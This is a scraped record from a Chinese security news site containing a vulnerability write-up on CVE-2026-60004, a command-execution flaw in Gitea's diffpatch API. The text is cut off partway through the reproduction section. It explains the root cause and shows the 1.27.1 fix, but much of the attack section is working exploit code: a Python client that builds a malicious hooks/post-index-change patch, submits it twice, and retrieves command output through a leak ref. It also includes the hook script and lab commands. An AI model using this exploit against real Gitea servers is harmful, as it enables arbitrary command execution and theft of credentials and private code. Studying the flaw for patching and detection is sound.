[{"_1":2,"_3":4},"root",{"_5":195},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1795308035000,"id","l67lk0sgay5edtvxvrq5uqess","title","Gitea diffpatch 补丁路径可触发 Git 钩子执行，CVE-2026-60004","originalTitle","CVE-2026-60004：两次 201，一个 hooks 路径——Gitea diffpatch 把补丁写成了钩子","summary","CVE-2026-60004 影响 Gitea 1.17–1.26 和 1.27.0，攻击者需拥有目标仓库写权限，经 /api/v1/repos/{owner}/{repo}/diffpatch 两次提交同一补丁即可使命令以 Gitea 进程用户执行。","reason","文章还原了补丁路径经 add/add 三方合并落入 Git 钩子目录的完整链路，并给出可重复的 PoC、修复对照与排查要点。","source",{"_72":194},"links",{"_184":193},"publishedAt","2026-11-14T17:40:13.000Z","discoveredAt","2026-11-16T08:50:18.961Z","timelineAt","category","disclosure","tags",[73,187,188,189,190,191,192],"score",79,"selected",true,"channel","news","story",{"_77":78,"_13":79},"x","readingMode","full","author","body",{"_61":183,"_184":-5,"_185":184,"_186":37},"outline",[80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112],"relatedStories",[76],"topics",[68,69],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fxcupfgrWS-U","reportCount",1,"additionalSourceCount",0,{"_70":74,"_72":75},{"_70":71,"_72":73},"slug","research","name","技术研究","vuln","漏洞披露",{"_77":78,"_13":79},"publicId","cc79af5b-03e9-4741-b908-93321d9cb3fc","Gitea diffpatch漏洞可执行Git钩子",{"_11":181,"_114":182,"_116":117},{"_11":179,"_114":180,"_116":117},{"_11":177,"_114":178,"_116":120},{"_11":175,"_114":176,"_116":120},{"_11":173,"_114":174,"_116":117},{"_11":171,"_114":172,"_116":120},{"_11":169,"_114":170,"_116":120},{"_11":167,"_114":168,"_116":120},{"_11":165,"_114":166,"_116":117},{"_11":163,"_114":164,"_116":120},{"_11":161,"_114":162,"_116":120},{"_11":159,"_114":160,"_116":120},{"_11":157,"_114":158,"_116":117},{"_11":155,"_114":156,"_116":120},{"_11":153,"_114":154,"_116":120},{"_11":151,"_114":152,"_116":120},{"_11":149,"_114":150,"_116":120},{"_11":147,"_114":148,"_116":120},{"_11":145,"_114":146,"_116":120},{"_11":143,"_114":144,"_116":117},{"_11":141,"_114":142,"_116":120},{"_11":139,"_114":140,"_116":120},{"_11":137,"_114":138,"_116":120},{"_11":135,"_114":136,"_116":120},{"_11":133,"_114":134,"_116":120},{"_11":131,"_114":132,"_116":120},{"_11":129,"_114":130,"_116":117},{"_11":127,"_114":128,"_116":120},{"_11":125,"_114":126,"_116":120},{"_11":123,"_114":124,"_116":120},{"_11":121,"_114":122,"_116":120},{"_11":118,"_114":119,"_116":120},{"_11":113,"_114":115,"_116":117},"sec-33","text","参考链接","level",2,"sec-32","5、排查要点",3,"sec-31","4、拿不到补丁时的调用侧处理","sec-30","3、补上这一行之后","sec-29","2、clone 参数应当改成非 bare","sec-28","1、上游 1.27.1 的修复","sec-27","六、修复建议","sec-26","6、同一路径的另一种写法","sec-25","5、没有调试日志时为什么看不到","sec-24","4、合并结果落到哪","sec-23","3、第二轮多出来的那次合并","sec-22","2、路径与权限校验为什么没拦住","sec-21","1、diffpatch 的补丁怎么应用","sec-20","五、漏洞分析","sec-19","6、执行上下文有多深","sec-18","5、两次 201 与钩子执行","sec-17","4、客户端与容器启动","sec-16","3、补丁","sec-15","2、环境","sec-14","1、目录结构","sec-13","四、复现过程","sec-12","3、边界","sec-11","2、攻击者能拿到的效果","sec-10","1、命令执行落在什么地方","sec-9","三、危害","sec-8","3、触发条件","sec-7","2、攻击面","sec-6","1、组件定位","sec-5","二、影响组件与攻击面","sec-4","2、受影响的版本与修复状态","sec-3","1、漏洞本身","sec-2","一、漏洞说明","sec-1","摘要","<h2 id=\"sec-1\">摘要</h2><p>Gitea 1.27.0 的 diffpatch 接口给补丁建的是 bare 临时仓库，工作树和 <code>$GIT_DIR</code> 是同一个目录。同一段补丁提交两次，第二轮 add/add 触发 <code>git apply -3</code> 的三方合并，补丁里的 <code>hooks/post-index-change</code> 被写进工作树，正好落进钩子目录，命令以 <code>uid=1000(git)</code> 执行。1.27.1 把 clone 改成非 bare，第二次提交直接 500。</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>项</p></td><td colspan=\"1\" rowspan=\"1\"><p>值</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVE</p></td><td colspan=\"1\" rowspan=\"1\"><p>CVE-2026-60004</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>组件</p></td><td colspan=\"1\" rowspan=\"1\"><p>Gitea diffpatch API</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>类型</p></td><td colspan=\"1\" rowspan=\"1\"><p>补丁路径 → Git 钩子 → 命令执行</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>影响版本</p></td><td colspan=\"1\" rowspan=\"1\"><p>1.17–1.26、1.27.0（公开 PoC 范围）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复版本</p></td><td colspan=\"1\" rowspan=\"1\"><p>1.27.1</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>实测结果</p></td><td colspan=\"1\" rowspan=\"1\"><p>两次 201 → <code>uid=1000(git)</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>关键条件</p></td><td colspan=\"1\" rowspan=\"1\"><p>bare 临时仓库 + <code>-3</code> 三方合并 + 100755 钩子名</p></td></tr></tbody></table><hr><h2 id=\"sec-2\">一、漏洞说明</h2><h3 id=\"sec-3\">1、漏洞本身</h3><p>出问题的是 Gitea 的 diffpatch 接口。任何拥有仓库写权限的账号，往 <code>/api/v1/repos/{owner}/{repo}/diffpatch</code> 提交一段补丁，就能让命令以 Gitea 服务的 OS 用户执行。编号 CVE-2026-60004，CVSS 9.8，已进 CISA KEV。</p><p>补丁里的路径是 <code>hooks/post-index-change</code>。没有 <code>.git/</code> 前缀，也不是路径穿越。Gitea 给补丁应用建的临时仓库是 bare 克隆，工作树和 <code>$GIT_DIR</code> 重合；补丁路径落到工作树，就是落到 <code>$GIT_DIR/hooks/</code>。</p><p>一次提交不够。第一轮 apply 只把钩子文件写进索引和树，磁盘上没有；第二轮路径已经在索引里，add/add 触发三方合并，合并结果写进工作树，钩子才出现。</p><h3 id=\"sec-4\">2、受影响的版本与修复状态</h3><p>公开复现仓库给出的范围是 1.17 到 1.26 以及 1.27.0，1.27.1 修复。NVD 的 CPE 范围到 1.27.1 之前，和这个区间一致。</p><p>跑过的版本：</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>版本</p></td><td colspan=\"1\" rowspan=\"1\"><p>状态</p></td><td colspan=\"1\" rowspan=\"1\"><p>实测行为</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>1.27.0</p></td><td colspan=\"1\" rowspan=\"1\"><p>受影响</p></td><td colspan=\"1\" rowspan=\"1\"><p>两次 201，命令以 <code>uid=1000(git)</code> 执行</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>1.27.1</p></td><td colspan=\"1\" rowspan=\"1\"><p>修复</p></td><td colspan=\"1\" rowspan=\"1\"><p>第二次 500，无输出</p></td></tr></tbody></table><p>上游的修复记录在 1.27.1 的 changelog：</p><pre><code>refactor: git patch apply (#38637) (#38638)</code></pre><p>两版在 <code>services/repository/files/patch.go</code> 里的关键差异是一行 clone 参数：</p><pre><code>-\tif err := t.Clone(ctx, opts.OldBranch, true); err != nil {\n+\t// here must NOT use bare repo, because the following git commands might operate working tree (\"--index\") directly\n+\tif err := t.Clone(ctx, opts.OldBranch, false); err != nil {</code></pre><p>没有独立的临时缓解，只有升级。</p><hr><h2 id=\"sec-5\">二、影响组件与攻击面</h2><h3 id=\"sec-6\">1、组件定位</h3><p>入口在 <code>routers/api/v1/repo/patch.go</code>，handler 只做参数组装。真正干活的是 <code>services/repository/files/patch.go</code>：</p><pre><code>ApplyDiffPatch\n  → gitPatchPrepare\n    → NewTemporaryUploadRepository\n    → t.Clone(ctx, opts.OldBranch, true)      // 1.27.0：bare\n    → t.SetDefaultIndex                        // git read-tree HEAD\n  → git apply --index --recount --cached ... -3\n  → t.WriteTree → t.CommitTree → t.Push</code></pre><p>apply 带 <code>-3</code> 的条件是 Git 版本不低于 2.32。容器里是 2.54.0，所以这条路径一定带三方合并。</p><p>问题不在 Web 路由，也不在权限中间件，在补丁应用服务给临时仓库选的目录布局。</p><h3 id=\"sec-7\">2、攻击面</h3><p>需要认证，且对目标仓库有写权限，不需要管理员。默认开放注册的实例，注册一个账号、建一个私有仓库，两个条件就齐了。</p><p>攻击只用 HTTP API，不需要 Git 客户端、管理员令牌或特制请求头。命令以 Gitea 进程的 OS 用户执行；官方容器里是 uid 1000 的 <code>git</code>，能读 <code>/data/gitea/conf/app.ini</code>、SQLite 数据库和所有仓库对象。</p><p>没有权限打不动：</p><pre><code>$ cd /opt/gitea-lab\n$ GITEA_PASSWORD='Attacker123!' python3 negative.py\n[anon] 404\n[viewer-auth] 200 viewer\n[viewer-diffpatch] 404 {\"message\":\"not found\",\"url\":\"http://127.0.0.1:3000/api/swagger\"}\n[wrong-password] 401 {\"message\":\"invalid username, password or token\",\"url\":\"http://127.0.0.1:3000/ap</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014515-26699beb-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=3aedda4aee53c09f\" loading=\"lazy\" decoding=\"async\" width=\"1378.2467607149267\"></p><p>匿名 404，私有仓库对未认证用户直接隐藏；<code>viewer</code> 对攻击者的私有仓库同样 404；密码错误停在 401。</p><p><code>negative.py</code>：</p><pre><code>\"\"\"负向对照：匿名、无权限用户、错误密码。\"\"\"\nimport sys\nsys.path.insert(0, \"/opt/gitea-lab\")\nimport json\nimport urllib.request\nimport lab\n\nBASE = \"http://127.0.0.1:3000\"\n\nc = lab.Client(BASE, \"attacker\", \"Attacker123!\")\nsc, repos = c.api(\"GET\", \"/api/v1/user/repos\")\nnames = [r[\"full_name\"] for r in repos]\nprint(\"[repos]\", sc, names[:5])\ntarget = names[0]\npatch = lab.build_patch(\"hooks/post-index-change\", \"100755\", lab.build_hook(\"id\", \"leak-neg\"))\n\n# 匿名\nreq = urllib.request.Request(\n    f\"{BASE}/api/v1/repos/{target}/diffpatch\",\n    data=json.dumps({\"content\": patch}).encode(),\n    method=\"POST\",\n    headers={\"Content-Type\": \"application/json\"},\n)\ntry:\n    with urllib.request.urlopen(req, timeout=10) as r:\n        print(\"[anon]\", r.status)\nexcept Exception as e:\n    print(\"[anon]\", getattr(e, \"code\", type(e).__name__))\n\n# viewer 无权限\nv = lab.Client(BASE, \"viewer\", \"Viewer123!\")\nsc, body = v.api(\"GET\", \"/api/v1/user\")\nprint(\"[viewer-auth]\", sc, body if isinstance(body, str) else body.get(\"login\"))\nsc, body = v.api(\"POST\", f\"/api/v1/repos/{target}/diffpatch\", {\"content\": patch})\nprint(\"[viewer-diffpatch]\", sc, str(body)[:160])\n\n# 错误密码\nw = lab.Client(BASE, \"attacker\", \"wrong-password\")\nsc, body = w.api(\"GET\", \"/api/v1/user\")\nprint(\"[wrong-password]\", sc, str(body)[:80])</code></pre><h3 id=\"sec-8\">3、触发条件</h3><p>缺一条都打不通：</p><ol><li><p>服务端用 bare 仓库做补丁应用的临时工作区。</p></li><li><p>apply 带 <code>--index</code> 和 <code>-3</code>，且 Git 版本不低于 2.32。</p></li><li><p>攻击者能控制补丁里的路径，且路径不以 <code>.git/</code> 开头。</p></li><li><p>路径名命中 Git 钩子名，文件模式是 100755。</p></li><li><p>需要第二次提交，让同路径已经在索引里，触发 add/add 三方合并。</p></li><li><p>同一次 apply 的索引更新会触发 <code>post-index-change</code>。</p></li></ol><hr><h2 id=\"sec-9\">三、危害</h2><h3 id=\"sec-10\">1、命令执行落在什么地方</h3><p>命令不在 HTTP 处理函数的栈上跑，在临时仓库的钩子里跑，身份是 Gitea 的 OS 用户。钩子执行时打印：</p><pre><code>uid=1000(git) gid=1000(git) groups=1000(git),1000(git)\n/data/gitea/tmp/local-repo/upload.git2571823231</code></pre><p>前两行是 <code>id</code> 和 <code>pwd</code>。工作目录和 Git 目录是同一个路径；完整的 <code>git rev-parse</code> 与钩子文件属性在「执行上下文有多深」这一节。落点是 <code>/data/gitea/tmp/local-repo/upload.git&lt;随机数&gt;/</code>，身份是 <code>git</code>。</p><h3 id=\"sec-11\">2、攻击者能拿到的效果</h3><p>Gitea 进程权限下的任意命令执行。容器里至少能：</p><ul><li><p>读 <code>/data/gitea/conf/app.ini</code>，里面有数据库连接串、密钥、SMTP 配置。</p></li><li><p>读 SQLite 数据库，拿到用户、令牌、仓库元数据。</p></li><li><p>读所有仓库对象，包括私有仓库。</p></li><li><p>往仓库里写对象和 ref，篡改代码或植入后门。</p></li><li><p>实例配了外部数据库或对象存储，就能用配置文件里的凭据继续横向。</p></li></ul><p>输出不回显在 HTTP 响应里。钩子从 <code>objects/info/alternates</code> 找到原仓库，把输出写成 blob，再 <code>mktree</code>、<code>commit-tree</code>、<code>update-ref</code> 到 <code>refs/heads/leak-*</code>；攻击者事后用 smart HTTP 取走。日志里只有两次 201。</p><h3 id=\"sec-12\">3、边界</h3><p>这个洞没法脱离 Gitea 的权限边界。</p><ul><li><p>官方容器、默认用户、只挂 <code>/data</code>：命令执行限制在 <code>git</code> 用户和挂载进来的数据，不能直接逃逸到宿主机。</p></li><li><p>Gitea 以 root 运行、挂载 docker socket、或把宿主机目录大面积挂进来：同一份命令执行能碰到更大的面。</p></li><li><p>数据库和对象存储在外网、凭据在 <code>app.ini</code> 里：攻击者可以带着凭据继续打外部服务。</p></li></ul><p>它是逻辑层漏洞，不是内核漏洞。不提供内存破坏或容器逃逸；上限就是 Gitea 进程的权限和挂载。验证覆盖官方容器加 SQLite，其他数据库或编排形态要单独确认。</p><hr><h2 id=\"sec-13\">四、复现过程</h2><h3 id=\"sec-14\">1、目录结构</h3><pre><code>/opt/gitea-lab/\n├── data-1.27.0/          # 1.27.0 的 SQLite 与仓库数据\n├── data-1.27.1/          # 1.27.1 的对照数据\n├── gitea_up.sh           # 起 1.27.0 / 1.27.1：重置数据、启动、等 API、建用户\n├── lab.py                # 认证、建仓、提交 N 次、取回 ref\n├── make_patch.py         # 把 hook.sh 包成 hooks/post-index-change 新文件补丁\n├── mechanism3.sh         # 纯 git 两轮：第一轮写树，第二轮 add/add\n├── mechanism_fixed.sh    # 非 bare 布局：钩子落工作树，不执行\n├── mitigation.sh         # core.hooksPath=/dev/null 对照\n├── inspect_live.sh       # 执行期间抓 ps 和临时目录\n├── negative.py           # 匿名、viewer 越权、错误密码\n└── poc_main.py           # 公开 PoC（0xBlackash）</code></pre><h3 id=\"sec-15\">2、环境</h3><pre><code>$ uname -r\n6.6.15-amd64\n$ docker version --format '{{.Server.Version}}'\n29.6.1</code></pre><p>镜像第一次要从 ghcr.io 拉：</p><pre><code>$ docker pull ghcr.io/go-gitea/gitea:1.27.0\n$ docker pull ghcr.io/go-gitea/gitea:1.27.1</code></pre><p>起 1.27.0。数据库用 SQLite，安装锁打开，注册关闭：</p><pre><code># 数据目录 + 只绑回环\n$ docker rm -f gitea-1.27.0 2&gt;/dev/null || true\n$ docker run -d --name gitea-1.27.0 \\\n  -p 127.0.0.1:3000:3000 \\\n  -v /opt/gitea-lab/data-1.27.0:/data \\\n  -e GITEA__database__DB_TYPE=sqlite3 \\\n  -e GITEA__security__INSTALL_LOCK=true \\\n  -e GITEA__server__ROOT_URL=http://127.0.0.1:3000/ \\\n  -e GITEA__server__HTTP_PORT=3000 \\\n  -e GITEA__service__DISABLE_REGISTRATION=true \\\n  ghcr.io/go-gitea/gitea:1.27.0\n# 轮询到 HTTP 200 再继续（-s 静默，成功不打印）\n$ until curl -sf -o /dev/null http://127.0.0.1:3000/api/v1/version; do sleep 2; done</code></pre><p>容器里的版本：</p><pre><code>$ docker exec gitea-1.27.0 sh -c 'git --version; gitea --version'</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014516-26c5a3fc-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=e66f902cbdf9e249\" loading=\"lazy\" decoding=\"async\" width=\"1558.4415668861363\"></p><h3 id=\"sec-16\">3、补丁</h3><p>补丁是一段钩子脚本加一个“新建可执行文件”的 diff。钩子做三件事：从 alternates 找到原仓库、执行命令、把输出写回一个 ref。</p><pre><code>#!/bin/sh\n# 从 alternates 找到原仓库\ngit_dir=$(git rev-parse --absolute-git-dir) || exit 1\norigin_objects=$(sed -n \"1p\" \"$git_dir/objects/info/alternates\") || exit 2\ncase \"$origin_objects\" in\n  /*) ;;\n  *) origin_objects=\"$git_dir/objects/$origin_objects\" ;;\nesac\norigin_git=${origin_objects%/objects}\n[ \"$origin_git\" != \"$origin_objects\" ] || exit 3\n# 执行命令，输出写成 blob，再挂到 refs/heads/leak-*\noutput_blob=$({ /bin/sh -c 'id; pwd'; command_status=$?; printf \"\\n[exit-status=%s]\\n\" \"$command_status\"; } 2&gt;&amp;1 | git --git-dir=\"$origin_git\" hash-object -w --stdin) || exit 4\ntree=$(printf \"100644 blob %s\\toutput\\n\" \"$output_blob\" | git --git-dir=\"$origin_git\" mktree) || exit 5\ncommit=$(printf \"command output\\n\" | GIT_AUTHOR_NAME=lab GIT_AUTHOR_EMAIL=lab@poc.local GIT_COMMITTER_NAME=lab GIT_COMMITTER_EMAIL=lab@poc.local git --git-dir=\"$origin_git\" commit-tree \"$tree\") || exit 6\ngit --git-dir=\"$origin_git\" update-ref refs/heads/leak-xxxx \"$commit\" || exit 7\nexit 0</code></pre><p><code>id; pwd</code> 只是示例；钩子大小随命令长度变化，「执行上下文有多深」里的输出用了更长的命令，所以那里是 1061。</p><p>补丁头把它声明成 100755 的新文件：</p><pre><code>diff --git a/hooks/post-index-change b/hooks/post-index-change\nnew file mode 100755\nindex 0000000000000000000000000000000000000000..&lt;blob&gt;\n--- /dev/null\n+++ b/hooks/post-index-change\n@@ -0,0 +1,&lt;N&gt; @@\n+#!/bin/sh\n+...</code></pre><p>补丁由 <code>lab.py</code> 的 <code>build_patch()</code> 生成：路径、模式、内容三个参数直接进补丁头。公开 PoC 是 Ashraf Zaryouh（0xBlackash）的 <code>0xBlackash/CVE-2026-60004</code>；<code>lab.py</code> 是可控变体，用来跑提交次数、路径、模式、钩子名的矩阵。</p><h3 id=\"sec-17\">4、客户端与容器启动</h3><p>创建一个普通账号，不给管理员：</p><pre><code>$ docker exec -u git gitea-1.27.0 gitea admin user create \\\n    --username attacker --password 'Attacker123!' \\\n    --email attacker@example.com --must-change-password=false</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014516-2709b779-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=62ca54399ea6d7f8\" loading=\"lazy\" decoding=\"async\" width=\"647.7272762370504\"></p><p>客户端只用 Python 标准库加 git：先认证、建仓，再提交补丁。代码在 <code>lab.py</code> 的 <code>Client</code> 类里，认证走 Basic Auth，建仓后循环 POST 补丁。</p><p><code>lab.py</code>：</p><pre><code>#!/usr/bin/env python3\n\"\"\"CVE-2026-60004 客户端：认证、建仓、提交补丁、取回 ref。\"\"\"\nimport argparse, base64, hashlib, json, os, secrets, shlex, shutil\nimport subprocess, sys, tempfile, urllib.error, urllib.parse, urllib.request\n\nTIMEOUT = 30.0\nUA = \"gitea-lab/1.0\"\n\n\nclass Client:\n    def __init__(self, base, user, pw):\n        self.base = base.rstrip(\"/\")\n        self.auth = \"Basic \" + base64.b64encode(f\"{user}:{pw}\".encode()).decode()\n\n    def api(self, method, path, payload=None):\n        data = json.dumps(payload, separators=(\",\", \":\")).encode() if payload is not None else None\n        req = urllib.request.Request(self.base + path, data=data, method=method, headers={\n            \"Accept\": \"application/json\", \"Authorization\": self.auth,\n            \"Content-Type\": \"application/json\", \"User-Agent\": UA})\n        try:\n            with urllib.request.urlopen(req, timeout=TIMEOUT) as r:\n                raw = r.read()\n                return r.status, json.loads(raw) if raw else None\n        except urllib.error.HTTPError as e:\n            return e.code, e.read().decode(\"utf-8\", \"replace\")[:300]\n\n\ndef blob_oid(content):\n    return hashlib.sha1(b\"blob %d\\0\" % len(content) + content).hexdigest()\n\n\ndef build_patch(path, mode, content):\n    n = content.count(b\"\\n\")\n    # new file diff：路径 + 模式 + blob oid\n    hdr = (f\"diff --git a/{path} b/{path}\\n\"\n           f\"new file mode {mode}\\n\"\n           f\"index {'0'*40}..{blob_oid(content)}\\n\"\n           f\"--- /dev/null\\n+++ b/{path}\\n\"\n           f\"@@ -0,0 +1,{n} @@\\n\").encode()\n    return (hdr + b\"\".join(b\"+\" + l for l in content.splitlines(keepends=True))).decode()\n\n\ndef build_hook(cmd, leak_ref):\n    qcmd = shlex.quote(cmd)\n    qref = shlex.quote(f\"refs/heads/{leak_ref}\")\n    # shared clone 的 alternates 指向原仓库；输出写成 blob，再 update-ref 回来\n    return (\"#!/bin/sh\\n\"\n            '# 从 alternates 找到原仓库\\n'\n            'git_dir=$(git rev-parse --absolute-git-dir) || exit 1\\n'\n            'origin_objects=$(sed -n \"1p\" \"$git_dir/objects/info/alternates\") || exit 2\\n'\n            'case \"$origin_objects\" in\\n'\n            '  /*) ;;\\n'\n            '  *) origin_objects=\"$git_dir/objects/$origin_objects\" ;;\\n'\n            'esac\\n'\n            'origin_git=${origin_objects%/objects}\\n'\n            '[ \"$origin_git\" != \"$origin_objects\" ] || exit 3\\n'\n            '# 执行命令，输出写成 blob，再挂到 refs/heads/leak-*\\n'\n            f\"output_blob=$({{ /bin/sh -c {qcmd}; \"\n            'command_status=$?; printf \"\\\\n[exit-status=%s]\\\\n\" \"$command_status\"; } 2&gt;&amp;1 | '\n            'git --git-dir=\"$origin_git\" hash-object -w --stdin) || exit 4\\n'\n            'tree=$(printf \"100644 blob %s\\\\toutput\\\\n\" \"$output_blob\" | '\n            'git --git-dir=\"$origin_git\" mktree) || exit 5\\n'\n            f'commit=$(printf \"command output\\\\n\" | GIT_AUTHOR_NAME=lab GIT_AUTHOR_EMAIL=lab@poc.local '\n            'GIT_COMMITTER_NAME=lab GIT_COMMITTER_EMAIL=lab@poc.local '\n            'git --git-dir=\"$origin_git\" commit-tree \"$tree\") || exit 6\\n'\n            f'git --git-dir=\"$origin_git\" update-ref {qref} \"$commit\" || exit 7\\n'\n            \"exit 0\\n\").encode()\n\n\ndef run_git(args, env=None):\n    r = subprocess.run([\"git\", *args], env=env or os.environ,\n                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE, timeout=TIMEOUT)\n    if r.returncode != 0:\n        raise RuntimeError(r.stderr.decode(\"utf-8\", \"replace\")[:300])\n    return r.stdout\n\n\ndef fetch_output(client, owner, repo, ref):\n    remote = f\"{client.base}/{urllib.parse.quote(owner)}/{urllib.parse.quote(repo)}.git\"\n    with tempfile.TemporaryDirectory(prefix=\"lab-\") as tmp:\n        bare = os.path.join(tmp, \"f.git\")\n        cfg = os.path.join(tmp, \"auth.config\")\n        with open(cfg, \"w\") as f:\n            f.write(f\"[http]\\n\\textraHeader = Authorization: {client.auth}\\n\")\n        env = {**os.environ, \"GIT_TERMINAL_PROMPT\": \"0\"}\n        run_git([\"init\", \"--bare\", \"--quiet\", bare], env)\n        run_git([\"-C\", bare, \"-c\", f\"include.path={cfg}\", \"fetch\", \"--quiet\", \"--no-tags\",\n                 remote, f\"refs/heads/{ref}\"], env)\n        return run_git([\"-C\", bare, \"show\", \"FETCH_HEAD:output\"], env)\n\n\ndef main():\n    p = argparse.ArgumentParser()\n    p.add_argument(\"url\")\n    p.add_argument(\"user\")\n    p.add_argument(\"cmd\")\n    p.add_argument(\"--patches\", type=int, default=1)\n    p.add_argument(\"--path\", default=\"hooks/post-index-change\")\n    p.add_argument(\"--mode\", default=\"100755\")\n    p.add_argument(\"--label\", default=\"\")\n    p.add_argument(\"--benign\", action=\"store_true\")\n    a = p.parse_args()\n\n    pw = os.environ.get(\"GITEA_PASSWORD\", \"\")\n    c = Client(a.url, a.user, pw)\n    sc, ver = c.api(\"GET\", \"/api/v1/version\")\n    print(f\"[version] {sc} {ver}\")\n    sc, acct = c.api(\"GET\", \"/api/v1/user\")\n    owner = acct[\"login\"]\n    print(f\"[auth] {sc} user={owner}\")\n\n    repo = \"lab-\" + secrets.token_hex(4)\n    sc, _ = c.api(\"POST\", \"/api/v1/user/repos\", {\n        \"name\": repo, \"private\": True, \"auto_init\": True, \"default_branch\": \"main\"})\n    print(f\"[repo] {sc} {owner}/{repo}\")\n\n    leak = \"leak-\" + secrets.token_hex(3)\n    if a.benign:\n        patch = build_patch(\"notes.txt\", \"100644\", b\"hello\\n\")\n        sc, body = c.api(\"POST\", f\"/api/v1/repos/{owner}/{repo}/diffpatch\", {\"content\": patch})\n        print(f\"[benign] HTTP {sc} {str(body)[:160]}\")\n        return\n    hook = build_hook(a.cmd, leak)\n    patch = build_patch(a.path, a.mode, hook)\n    # 第一次只写树；第二次 add/add 触发三方合并\n    for i in range(a.patches):\n        sc, body = c.api(\"POST\", f\"/api/v1/repos/{owner}/{repo}/diffpatch\", {\"content\": patch})\n        print(f\"[patch {i+1}/{a.patches}] HTTP {sc} {str(body)[:120]}\")\n\n    try:\n        raw = fetch_output(c, owner, repo, leak)\n        print(\"[output]\")\n        sys.stdout.write(raw.decode(\"utf-8\", \"replace\"))\n        print(f\"\\n[result] EXECUTED ref={leak}\")\n    except Exception as e:\n        print(f\"[result] NO-OUTPUT ({e})\")\n\n\nif __name__ == \"__main__\":\n    main()</code></pre><p>建仓返回 201：</p><pre><code>[version] 200 {'version': '1.27.0'}\n[auth] 200 user=attacker\n[repo] 201 attacker/full-1311b0</code></pre><p>第一次提交也返回 201，响应里是普通提交对象：</p><pre><code>[status] 201\n{\n  \"content\": null,\n  \"commit\": {\n    \"url\": \"http://127.0.0.1:3000/api/v1/repos/attacker/full-1311b0/git/commits/824cc69efdaefdc0edf2613758a24b39fbe1c243\",\n    \"sha\": \"824cc69efdaefdc0edf2613758a24b39fbe1c243\",\n    …\n    \"message\": \"apply-patch\\n\",</code></pre><p>响应体只保留状态码和 commit URL 里的 SHA 前缀，其余用 <code>…</code> 省略；<code>lab.py</code> 只打印前 120 个字符，行尾看起来是断的。</p><h3 id=\"sec-18\">5、两次 201 与钩子执行</h3><p>一次提交：</p><pre><code>$ cd /opt/gitea-lab\n$ export GITEA_PASSWORD='Attacker123!'\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id; hostname' --patches 1</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014517-275386c5-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=278f48a9276dd8df\" loading=\"lazy\" decoding=\"async\" width=\"1435.8766311570703\"></p><p>两次提交：</p><pre><code>$ python3 lab.py http://127.0.0.1:3000 attacker 'id; hostname' --patches 2</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014517-27a4741f-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=4b671d587e0dc266\" loading=\"lazy\" decoding=\"async\" width=\"1471.5909170648777\"></p><p>hostname 是容器 ID，重跑会变；uid 和输出结构不变。</p><pre><code>flowchart TD\n    A[\"仓库写权限\"] --&gt; B[\"POST /diffpatch 第一次\"]\n    B --&gt; C[\"bare 临时仓库 git apply --cached -3\"]\n    C --&gt; D[\"钩子只进索引，不落盘\"]\n    D --&gt; E[\"commit / push：钩子进入仓库树\"]\n    E --&gt; F[\"POST /diffpatch 第二次\"]\n    F --&gt; G[\"新 bare 克隆，HEAD 已有 hooks/post-index-change\"]\n    G --&gt; H[\"add/add 三方合并，结果写进工作树\"]\n    H --&gt; I[\"工作树 = $GIT_DIR，落到 hooks/\"]\n    I --&gt; J[\"索引更新，post-index-change 执行\"]</code></pre><p>两次提交的差别只有一处：第一次 apply 是新增文件，直接进索引；第二次索引里已有同路径，add/add 走三方合并，合并结果写进工作树。</p><h3 id=\"sec-19\">6、执行上下文有多深</h3><p>钩子里加一个 <code>sleep 20</code>，在后台跑，趁它挂着看进程：</p><pre><code>$ GITEA_PASSWORD='Attacker123!' python3 lab.py http://127.0.0.1:3000 attacker 'sleep 20; id; pwd' --patches 2 &amp;\n$ sleep 6\n$ docker exec gitea-1.27.0 sh -c 'ps -ef | grep -E \"git|post-index|sleep\" | grep -v grep'</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014518-280c92db-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=093d341fa25947db\" loading=\"lazy\" decoding=\"async\" width=\"1480.5194885418296\"></p><p><code>git apply</code> 的参数和源码里的调用一字不差：<code>--index</code>、<code>--cached</code>、<code>-3</code> 都在。钩子进程的 argv[0] 是 